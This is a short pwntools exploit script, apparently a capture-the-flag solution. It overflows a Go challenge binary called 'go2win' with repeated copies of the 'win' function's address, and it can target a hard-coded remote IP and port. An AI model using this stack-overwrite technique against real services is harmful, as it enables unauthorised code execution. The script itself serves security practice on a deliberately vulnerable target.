#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./go2win")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("92.246.89.201", 10003)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	win = exe.symbols['main.win']

	payload = b''.join([
		p64(win) * 10,
	])

	r.sendline(payload)
	r.interactive()


if __name__ == "__main__":
	main()
